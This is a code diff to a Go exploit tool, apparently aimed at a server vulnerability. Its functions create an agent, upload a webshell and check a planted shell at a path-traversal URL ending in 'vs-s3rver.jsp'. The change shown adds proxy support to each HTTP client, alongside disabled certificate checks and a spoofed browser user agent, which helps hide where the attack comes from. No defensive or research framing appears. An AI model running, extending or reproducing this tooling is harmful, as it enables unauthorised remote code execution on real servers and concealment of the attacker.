@@ -2,16 +2,16 @@ package c_22005
 
 import (
 	"fmt"
+	"github.com/imroc/req/v3"
 	"io/ioutil"
 	"math/rand"
 	"os"
 	"strings"
 	"time"
-
-	"github.com/imroc/req/v3"
 )
 
 var user_agent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36 Edg/80.0.361.54"
+var Proxy_server = ""
 
 func id_generator(add_time int64) string {
 	var list_str = []string{}
@@ -53,6 +53,7 @@ func Create_agent(url, log_param, agent_name string) {
 	client.EnableForceHTTP1()
 	client.SetUserAgent(user_agent)
 	client.SetTimeout(2 * time.Second)
+	client.SetProxyURL(Proxy_server)
 	myheader := map[string]string{"Cache-Control": "max-age=0",
 		"Upgrade-Insecure-Requests": "1",
 		"User-Agent":                "Mozilla/5.0",
@@ -108,6 +109,7 @@ func Upload_shell(url, log_param, agent_name, wb_str string) {
 	client.EnableInsecureSkipVerify()
 	client.EnableForceHTTP1()
 	client.SetUserAgent(user_agent)
+	client.SetProxyURL(Proxy_server)
 	resp, err := client.R().SetContentType("application/json").
 		SetHeaders(myheader).
 		SetBody(data).
@@ -202,6 +204,7 @@ func generate_manifest(webshell_location, webshell string) string {
 
 func Check(url string) {
 	client := req.C()
+	client.SetProxyURL(Proxy_server)
 	client.SetTimeout(2 * time.Second)
 	shell_url := url + "/idm/..;/" + "vs-s3rver.jsp"
 	resp, err := client.R().
